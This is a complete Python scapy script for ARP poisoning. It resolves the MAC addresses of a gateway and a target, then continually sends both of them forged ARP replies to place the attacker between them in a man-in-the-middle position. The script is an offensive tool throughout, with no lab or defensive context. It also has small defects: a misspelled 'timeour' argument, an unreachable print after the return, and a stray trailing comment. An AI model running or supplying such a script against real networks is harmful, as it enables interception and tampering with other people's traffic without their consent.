from scapy.all import *
from scapy.layers.inet import TCP, IP, sr, ICMP
from scapy.layers.l2 import ARP, Ether, srp1

def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
    while True:
        send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip), verbose=0)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip), verbose=0)
        print(f"Attacking GW {gw_ip} and the target {target_ip} ...")
        time.sleep(1) 


def mac_grabber(gw_ip, target_ip):
    answer_gw = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw_ip, hwdst='ff:ff:ff:ff:ff:ff', op=1), timeour=2, verbose=0, retry=1) 
    gw_mac = answer_gw.hwsrc
    answer_target = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', op=1), timeour=2, verbose=0, retry=1)
    target_mac = answer_target.hwsrc
    return gw_mac, target_mac
    print(f'The MAC address of the GW is: {gw_mac}\nAnd the MAC address of the target is: {target_mac}')


gw_ip = input('Enter the GW IP address:\t')
target_ip = input('Enter the target IP address:\t')
gw_mac, target_mac = mac_grabber(gw_ip, target_ip)
arp_poison(gw_ip, gw_mac, target_ip, target_mac)

# GLITCH4422
